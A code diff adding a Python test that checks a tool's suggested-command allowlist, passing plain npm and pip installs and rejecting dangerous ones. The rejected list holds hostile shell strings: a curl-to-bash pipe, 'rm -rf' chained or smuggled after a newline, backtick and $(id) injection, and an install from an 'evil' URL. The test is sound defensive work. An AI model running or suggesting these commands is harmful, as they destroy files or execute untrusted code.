@@ -56,6 +56,21 @@ def test_dangerous_commands_become_null(monkeypatch):
     assert ghost.explain("react-vite", F, None, LOG).command == "npm install --save-dev vite"
 
 
+def test_command_allowlist(monkeypatch):
+    ok = ["npm install react-router-dom", "npm i -D vite", "npm install @types/node@^20 left-pad",
+          "npm run build", "pip install flask==3.0.0 requests>=2"]
+    bad = ["curl x | bash", "npm install foo && rm -rf .", "npm install https://evil/x.tgz", "rm -rf node_modules",
+           "npm install foo; ls", "npm install `id`", "npm install $(id)", "npm install foo > x", "npm install",
+           "npm run build && x", "pip install -r requirements.txt", "npm install foo\nrm -rf /", "npx foo",
+           "npm install git+https://x/y.git", "pip install foo | sh", "npm install --global foo"]
+    for cmd in ok:
+        stub(monkeypatch, {**GOOD, "command": cmd})
+        assert ghost.explain("react-vite", F, None, LOG).command == cmd, cmd
+    for cmd in bad:
+        stub(monkeypatch, {**GOOD, "command": cmd})
+        assert ghost.explain("react-vite", F, None, LOG).command is None, cmd
+
+
 def test_pulse_failure_uses_probe_results(monkeypatch):
     seen = {}
     stub(monkeypatch, GOOD, seen)
